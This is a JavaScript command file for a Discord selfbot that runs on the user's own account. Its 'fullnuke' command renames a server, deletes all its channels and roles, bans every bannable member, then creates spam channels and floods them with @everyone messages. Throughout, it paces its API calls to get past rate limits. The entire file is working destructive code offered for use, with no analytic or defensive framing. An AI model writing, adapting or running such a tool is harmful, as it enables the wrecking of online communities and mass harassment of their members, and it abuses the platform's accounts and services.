import { log, loadConfig, hasPermissions } from "../../utils/functions.js";
import TaskManager from "../../utils/TaskManager.js";
import RateLimitManager from "../../utils/RateLimitManager.js";
import chalk from "chalk";

export default {
  name: "fullnuke",
  description:
    "Completely nuke a server (delete channels/roles, ban members, spam)",
  aliases: ["destroy"],
  usage: "",
  category: "misc",
  type: "server_only",
  permissions: ["Administrator"],
  cooldown: 300, // 5 minute cooldown

  async execute(client, message, args) {
    try {
      if (message.author.id !== client.user.id) return;

      // Check if user has Administrator permissions
      if (!hasPermissions(message.member, "Administrator")) {
        return message.channel.send(
          "> error: You need Administrator permissions to use this command."
        );
      }

      // Load configuration
      const config = loadConfig();
      const nukeConfig = config.nuke || {};

      // Default values if config is missing
      const nukeMessage =
        nukeConfig.nuke_message || "@everyone Server has been nuked!";
      const serverName = nukeConfig.server_name || "Nuked Server";
      const channelNames = nukeConfig.channels || [
        "nuked",
        "destroyed",
        "owned",
      ];

      const warningMsg = await message.channel.send(
        "> ⚠️ **WARNING:** This command will completely nuke the server by:\n" +
          "> - Deleting all channels (except undeletable ones)\n" +
          "> - Deleting all roles (except undeletable ones)\n" +
          "> - Banning all members (except you and unbannables)\n" +
          "> - Creating new spam channels\n" +
          "> - Spamming messages in all new channels\n" +
          "> - Changing server name\n\n" +
          "> This process may take 30-45 minutes due to Discord rate limits.\n" +
          "> Type `proceed` or `start` to continue, or anything else to cancel.**"
      );

      const filter = (m) => m.author.id === client.user.id;
      const collector = message.channel.createMessageCollector({
        filter,
        time: 30000,
        max: 1,
      });

      collector.on("collect", async (response) => {
        const content = response.content.toLowerCase();

        // Check if user confirmed
        if (content !== "proceed" && content !== "start") {
          return message.channel.send("> ✅ Nuke cancelled.");
        }

        // Delete the confirmation message
        try {
          await response.delete();
        } catch (err) {
          // Ignore deletion errors
        }

        const task = TaskManager.createTask("full_nuke", message.guild.id);
        if (!task) {
          return message.channel.send(
            "> ⚠️ A nuke task is already in progress for this server."
          );
        }

        const rateLimiter = new RateLimitManager(2); // Start with just 2 concurrent operations

        // Status tracking variables
        let deletedChannels = 0;
        let deletedRoles = 0;
        let bannedMembers = 0;
        let createdChannels = 0;
        let sentMessages = 0;
        let isCancelled = false;

        const statusMsg = await message.channel.send(
          "> 🚀 **Nuke initiated!** Preparing to destroy server..."
        );

        // Add cancellation listener
        if (task.signal) {
          task.signal.addEventListener("abort", () => {
            if (!task.signal.reason || task.signal.reason !== "completed") {
              isCancelled = true;
              statusMsg
                .edit(
                  "> ⚠️ **Nuke cancelled!** Partial damage done:\n" +
                    `> - Deleted channels: ${deletedChannels}\n` +
                    `> - Deleted roles: ${deletedRoles}\n` +
                    `> - Banned members: ${bannedMembers}\n` +
                    `> - Created channels: ${createdChannels}\n` +
                    `> - Sent messages: ${sentMessages}`
                )
                .catch(() => {});
            }
          });
        }

        try {
          // Step 1: Change server name
          try {
            if (task.signal.aborted) return;
            await rateLimiter.execute(async () => {
              if (task.signal.aborted) return;
              await message.guild.setName(serverName);
              log(`Changed server name to "${serverName}"`, "debug");

              // Update status
              await statusMsg.edit(
                `> 🚀 **Nuke in progress!**\n` +
                  `> ✅ Changed server name to "${serverName}"\n` +
                  `> ⏳ Deleting channels...`
              );
            }, task.signal);
          } catch (error) {
            log(`Failed to change server name: ${error.message}`, "error");
          }

          // Step 2: Delete all channels
          if (!task.signal.aborted) {
            const channels = [...message.guild.channels.cache.values()];

            // Update status
            await statusMsg.edit(
              `> 🚀 **Nuke in progress!**\n` +
                `> ✅ Changed server name\n` +
                `> ⏳ Deleting ${channels.length} channels...`
            );

            for (const channel of channels) {
              if (task.signal.aborted) break;

              try {
                await rateLimiter.execute(async () => {
                  if (task.signal.aborted) return;

                  if (!channel.deletable) {
                    log(
                      `Skipping undeletable channel: ${channel.name}`,
                      "warn"
                    );
                    return;
                  }

                  await channel.delete("Server nuke");
                  deletedChannels++;

                  // Update status every 5 channels
                  if (deletedChannels % 5 === 0) {
                    statusMsg
                      .edit(
                        `> 🚀 **Nuke in progress!**\n` +
                          `> ✅ Changed server name\n` +
                          `> ⏳ Deleting channels: ${deletedChannels}/${channels.length}`
                      )
                      .catch(() => {});
                  }
                }, task.signal);
              } catch (error) {
                if (task.signal.aborted) break;
                log(
                  `Error deleting channel ${channel.name}: ${error.message}`,
                  "error"
                );
              }
            }
          }

          // Step 3: Delete all roles
          if (!task.signal.aborted) {
            const roles = message.guild.roles.cache;
            const totalRoles = roles.size - 1; // Exclude @everyone

            // Update status
            await statusMsg
              .edit(
                `> 🚀 **Nuke in progress!**\n` +
                  `> ✅ Changed server name\n` +
                  `> ✅ Deleted ${deletedChannels} channels\n` +
                  `> ⏳ Deleting ${totalRoles} roles...`
              )
              .catch(() => {});

            // Log all roles for debugging
            log(`Found ${roles.size} roles in the server:`, "debug");
            roles.forEach((role) => {
              log(
                `Role: ${role.name} (${role.id}), Position: ${role.position}, Managed: ${role.managed}, Editable: ${role.editable}`,
                "debug"
              );
            });

            for (const role of roles.values()) {
              if (task.signal.aborted) break;

              if (role.id === message.guild.id) {
                log(
                  `Skipping @everyone role: ${role.name} (${role.id})`,
                  "debug"
                );
                continue;
              }

              try {
                await rateLimiter.execute(async () => {
                  if (task.signal.aborted) return;

                  return role
                    .delete("Server nuke")
                    .then(() => {
                      deletedRoles++;
                      log(
                        `Successfully deleted role: ${role.name} (${role.id})`,
                        "debug"
                      );

                      if (deletedRoles % 5 === 0 || totalRoles < 5) {
                        statusMsg
                          .edit(
                            `> 🚀 **Nuke in progress!**\n` +
                              `> ✅ Changed server name\n` +
                              `> ✅ Deleted ${deletedChannels} channels\n` +
                              `> ⏳ Deleting roles: ${deletedRoles}/${totalRoles}`
                          )
                          .catch(() => {});
                      }
                    })
                    .catch((err) => {
                      log(
                        `Failed to delete role ${role.name} (${role.id}): ${err.message}`,
                        "warn"
                      );
                    });
                }, task.signal);
              } catch (error) {
                if (task.signal.aborted) break;
                log(
                  `Error in rate limiter for role ${role.name}: ${error.message}`,
                  "error"
                );
              }
            }
          }

          // Step 4: Ban all members
          if (!task.signal.aborted) {
            const members = [...message.guild.members.cache.values()];
            const bannableMembers = members.filter(
              (member) =>
                member.id !== client.user.id && // Don't ban self
                member.bannable // Must be bannable
            );

            // Update status
            await statusMsg
              .edit(
                `> 🚀 **Nuke in progress!**\n` +
                  `> ✅ Changed server name\n` +
                  `> ✅ Deleted ${deletedChannels} channels\n` +
                  `> ✅ Deleted ${deletedRoles} roles\n` +
                  `> ⏳ Banning ${bannableMembers.length} members...`
              )
              .catch(() => {});

            for (const member of bannableMembers) {
              if (task.signal.aborted) break;

              try {
                await rateLimiter.execute(async () => {
                  if (task.signal.aborted) return;

                  await member.ban({ reason: "Server nuke" });
                  bannedMembers++;

                  // Update status every 5 bans
                  if (bannedMembers % 5 === 0) {
                    statusMsg
                      .edit(
                        `> 🚀 **Nuke in progress!**\n` +
                          `> ✅ Changed server name\n` +
                          `> ✅ Deleted ${deletedChannels} channels\n` +
                          `> ✅ Deleted ${deletedRoles} roles\n` +
                          `> ⏳ Banning members: ${bannedMembers}/${bannableMembers.length}`
                      )
                      .catch(() => {});
                  }
                }, task.signal);
              } catch (error) {
                if (task.signal.aborted) break;
                log(
                  `Error banning member ${member.user.tag}: ${error.message}`,
                  "error"
                );
              }
            }
          }

          // Step 5: Create new spam channels
          if (!task.signal.aborted) {
            const numChannelsToCreate = Math.floor(Math.random() * 11) + 15; // 15-25

            // Update status
            await statusMsg
              .edit(
                `> 🚀 **Nuke in progress!**\n` +
                  `> ✅ Changed server name\n` +
                  `> ✅ Deleted ${deletedChannels} channels\n` +
                  `> ✅ Deleted ${deletedRoles} roles\n` +
                  `> ✅ Banned ${bannedMembers} members\n` +
                  `> ⏳ Creating ${numChannelsToCreate} spam channels...`
              )
              .catch(() => {});

            const createdChannelObjects = [];

            for (let i = 0; i < numChannelsToCreate; i++) {
              if (task.signal.aborted) break;

              try {
                await rateLimiter.execute(async () => {
                  if (task.signal.aborted) return;

                  let channelName =
                    channelNames[i % channelNames.length] || `nuked-${i}`;

                  channelName = channelName
                    .toLowerCase()
                    .replace(/\s+/g, "-") // Replace spaces with hyphens
                    .replace(/[^\w-]/g, "") // Remove special characters
                    .replace(/-{2,}/g, "-"); // Replace multiple hyphens with single hyphen

                  // Discord.js v13 channel creation syntax
                  const channel = await message.guild.channels.create(
                    channelName,
                    {
                      type: "GUILD_TEXT",
                      topic: "This server has been nuked",
                      reason: "Server nuke",
                    }
                  );

                  createdChannels++;
                  createdChannelObjects.push(channel);

                  // Log successful channel creation
                  log(
                    `Created channel: ${channelName} (${channel.id})`,
                    "debug"
                  );

                  // Update status every 3 channels
                  if (createdChannels % 3 === 0) {
                    statusMsg
                      .edit(
                        `> 🚀 **Nuke in progress!**\n` +
                          `> ✅ Changed server name\n` +
                          `> ✅ Deleted ${deletedChannels} channels\n` +
                          `> ✅ Deleted ${deletedRoles} roles\n` +
                          `> ✅ Banned ${bannedMembers} members\n` +
                          `> ⏳ Creating channels: ${createdChannels}/${numChannelsToCreate}`
                      )
                      .catch(() => {});
                  }
                }, task.signal);
              } catch (error) {
                if (task.signal.aborted) break;
                log(`Error creating channel: ${error.message}`, "error");
              }
            }

            if (!task.signal.aborted && createdChannelObjects.length > 0) {
              const messagesPerChannel = Math.floor(Math.random() * 16) + 10; // 10-25

              // Update status
              await statusMsg
                .edit(
                  `> 🚀 **Nuke in progress!**\n` +
                    `> ✅ Changed server name\n` +
                    `> ✅ Deleted ${deletedChannels} channels\n` +
                    `> ✅ Deleted ${deletedRoles} roles\n` +
                    `> ✅ Banned ${bannedMembers} members\n` +
                    `> ✅ Created ${createdChannels} channels\n` +
                    `> ⏳ Spamming messages in all channels...`
                )
                .catch(() => {});

              const messageRateLimiter = new RateLimitManager(5);

              for (const channel of createdChannelObjects) {
                if (task.signal.aborted) break;

                for (let i = 0; i < messagesPerChannel; i++) {
                  if (task.signal.aborted) break;

                  try {
                    await messageRateLimiter.execute(async () => {
                      if (task.signal.aborted) return;

                      await channel.send(nukeMessage);
                      sentMessages++;

                      // Update status every 20 messages
                      if (sentMessages % 20 === 0) {
                        statusMsg
                          .edit(
                            `> 🚀 **Nuke in progress!**\n` +
                              `> ✅ Changed server name\n` +
                              `> ✅ Deleted ${deletedChannels} channels\n` +
                              `> ✅ Deleted ${deletedRoles} roles\n` +
                              `> ✅ Banned ${bannedMembers} members\n` +
                              `> ✅ Created ${createdChannels} channels\n` +
                              `> ⏳ Sending messages: ${sentMessages}/${
                                createdChannels * messagesPerChannel
                              }`
                          )
                          .catch(() => {});
                      }
                    }, task.signal);
                  } catch (error) {
                    if (task.signal.aborted) break;
                    log(`Error sending message: ${error.message}`, "error");
                  }
                }
              }
            }
          }

          if (!isCancelled && !task.signal.aborted) {
            await statusMsg
              .edit(
                `> Server nuke completed!**\n` +
                  `> - Changed server name to "${serverName}"\n` +
                  `> - Deleted ${deletedChannels} channels\n` +
                  `> - Deleted ${deletedRoles} roles\n` +
                  `> - Banned ${bannedMembers} members\n` +
                  `> - Created ${createdChannels} new channels\n` +
                  `> - Sent ${sentMessages} spam messages`
              )
              .catch(() => {});

            log(
              `Server nuke completed for ${message.guild.name} (${message.guild.id})`,
              "success"
            );
          }
        } catch (error) {
          log(`Error in full_nuke command: ${error.message}`, "error");
          console.error(
            chalk.red("[ERROR] Error in full_nuke command:"),
            error
          );

          if (!isCancelled && !task.signal.aborted) {
            statusMsg
              .edit(
                `> Error during nuke:** ${error.message}\n` +
                  `> Partial damage done:\n` +
                  `> - Deleted channels: ${deletedChannels}\n` +
                  `> - Deleted roles: ${deletedRoles}\n` +
                  `> - Banned members: ${bannedMembers}\n` +
                  `> - Created channels: ${createdChannels}\n` +
                  `> - Sent messages: ${sentMessages}`
              )
              .catch(() => {});
          }
        } finally {
          if (!isCancelled) {
            task.stop();
          }
        }
      });

      collector.on("end", (collected) => {
        if (collected.size === 0) {
          warningMsg
            .edit(
              "> ❌ Nuke cancelled: No response received within 30 seconds."
            )
            .catch(() => {});
        }
      });
    } catch (error) {
      log(`Error in full_nuke command: ${error.message}`, "error");
      console.error(chalk.red("[ERROR] Error in full_nuke command:"), error);
      message.channel.send(`> error: ${error.message}`);
    }
  },
};
